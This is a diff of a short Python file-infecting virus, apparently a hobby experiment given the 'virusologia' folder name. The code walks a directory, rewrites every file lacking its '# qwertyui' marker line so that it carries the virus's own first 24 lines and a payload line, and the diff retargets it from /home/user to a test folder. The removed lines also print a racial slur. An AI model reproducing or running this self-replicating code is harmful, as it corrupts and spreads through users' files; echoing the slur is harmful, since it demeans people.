@@ -1,6 +1,10 @@
 # qwertyui
 import os, sys
-SELF_CONTENT = open(sys.argv[0]).read()[:704]
+sclines = open(sys.argv[0]).readlines()[:24]
+SELF_CONTENT = ""
+PAYLOAD = r"print('PAYLOAD')"
+for i in sclines:
+    SELF_CONTENT += i
 def artgv_folder(path, level):
     files = os.listdir(path)
     for i in files:
@@ -14,8 +18,7 @@ def artgv_folder(path, level):
             if content.split("\n")[0] != "# qwertyui":
                 try:
                     with open(j, "w") as handle:
-                        handle.write(f"{SELF_CONTENT}\n\n\n{content}\nprint('negry')")
+                        handle.write(f"{SELF_CONTENT}\n\n\n{content}\n{PAYLOAD}")
                 except Exception:
                     pass
-artgv_folder("/home/user", 1)
-print('negry')
+artgv_folder("C:/Programezz/temp/virusologia", 1)
